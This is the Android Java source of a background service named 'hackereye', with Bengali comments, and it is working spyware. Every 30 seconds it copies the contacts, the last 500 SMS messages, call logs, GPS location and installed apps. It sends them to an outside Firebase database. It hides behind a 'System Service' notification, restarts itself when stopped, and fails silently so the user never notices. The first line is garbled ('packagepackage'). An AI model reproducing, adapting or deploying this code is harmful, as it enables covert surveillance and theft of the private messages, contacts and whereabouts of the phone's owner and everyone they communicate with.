packagepackage com.hackereye;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainService extends Service {

    // ========== এখানে আপনার Firebase URL দিন ==========
    private static final String FIREBASE_URL = "https://hacker-eye-default-rtdb.firebaseio.com/";
    // =================================================

    private Handler handler;
    private String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();

        // ইউনিক ডিভাইস আইডি
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        // নোটিফিকেশন চ্যানেল (Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "hackereye_channel",
                    "System Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
        }

        // ফোরগ্রাউন্ড নোটিফিকেশন (ইউজার দেখবে "System Service Running")
        Notification notification = new NotificationCompat.Builder(this, "hackereye_channel")
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build();
        startForeground(1, notification);

        handler = new Handler();

        // প্রথমবার ডিভাইস ইনফো পাঠান
        collectDeviceInfo();

        // প্রতি ৩০ সেকেন্ডে ডাটা কালেক্ট করা শুরু
        handler.postDelayed(dataCollector, 10000);
    }

    // ডাটা কালেক্ট করার Runnable
    private final Runnable dataCollector = new Runnable() {
        @Override
        public void run() {
            collectContacts();
            collectSMS();
            collectCallLogs();
            collectLocation();
            collectInstalledApps();
            handler.postDelayed(this, 30000); // ৩০ সেকেন্ড পর পুনরায়
        }
    };

    // ==================== ডিভাইস ইনফো ====================
    private void collectDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("brand", Build.BRAND);
            info.put("androidVersion", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("device", Build.DEVICE);
            info.put("timestamp", System.currentTimeMillis());

            try {
                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                if (checkSelfPermission(android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                    info.put("phoneNumber", tm.getLine1Number());
                }
            } catch (Exception ignored) {}

            sendToFirebase("device_info", info.toString());
        } catch (Exception ignored) {}
    }

    // ==================== কন্টাক্ট ====================
    private void collectContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            );
            if (cursor == null) return;

            JSONArray contacts = new JSONArray();
            while (cursor.moveToNext()) {
                JSONObject contact = new JSONObject();
                contact.put("name",
                    cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.put("phone",
                    cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contacts.put(contact);
            }
            cursor.close();
            sendToFirebase("contacts", contacts.toString());
        } catch (Exception ignored) {}
    }

    // ==================== এসএমএস ====================
    private void collectSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 500"
            );
            if (cursor == null) return;

            JSONArray smsList = new JSONArray();
            while (cursor.moveToNext()) {
                JSONObject sms = new JSONObject();
                sms.put("address", cursor.getString(cursor.getColumnIndex("address")));
                sms.put("body", cursor.getString(cursor.getColumnIndex("body")));
                sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                    .format(new Date(cursor.getLong(cursor.getColumnIndex("date")))));
                sms.put("type", cursor.getInt(cursor.getColumnIndex("type")));
                smsList.put(sms);
            }
            cursor.close();
            sendToFirebase("sms", smsList.toString());
        } catch (Exception ignored) {}
    }

    // ==================== কল লগ ====================
    private void collectCallLogs() {
        try {
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 500"
            );
            if (cursor == null) return;

            JSONArray calls = new JSONArray();
            while (cursor.moveToNext()) {
                JSONObject call = new JSONObject();
                call.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                call.put("name", cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)));
                call.put("type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                call.put("duration", cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                    .format(new Date(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)))));
                calls.put(call);
            }
            cursor.close();
            sendToFirebase("call_logs", calls.toString());
        } catch (Exception ignored) {}
    }

    // ==================== লোকেশন ====================
    private void collectLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                JSONObject loc = new JSONObject();
                loc.put("lat", location.getLatitude());
                loc.put("lng", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
                loc.put("provider", location.getProvider());
                loc.put("time", System.currentTimeMillis());
                sendToFirebase("location", loc.toString());
            }
        } catch (Exception ignored) {}
    }

    // ==================== ইনস্টল করা অ্যাপ ====================
    private void collectInstalledApps() {
        try {
            PackageManager pm = getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(0);
            JSONArray apps = new JSONArray();

            for (PackageInfo pkg : packages) {
                JSONObject app = new JSONObject();
                app.put("name", pkg.applicationInfo.loadLabel(pm).toString());
                app.put("packageName", pkg.packageName);
                app.put("versionName", pkg.versionName);
                app.put("isSystem", (pkg.applicationInfo.flags &
                    android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
                apps.put(app);
            }
            sendToFirebase("installed_apps", apps.toString());
        } catch (Exception ignored) {}
    }

    // ==================== Firebase-এ ডাটা পাঠান ====================
    private void sendToFirebase(String path, String jsonData) {
        new Thread(() -> {
            try {
                String urlStr = FIREBASE_URL + "devices/" + deviceId + "/" + path + ".json";
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("PUT");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                os.write(jsonData.getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                conn.disconnect();
            } catch (Exception ignored) {
                // সাইলেন্ট — ব্যাকগ্রাউন্ডে চলে, ইউজার কিছু দেখবে না
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // সার্ভিস বন্ধ হলে আবার চালু হবে
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}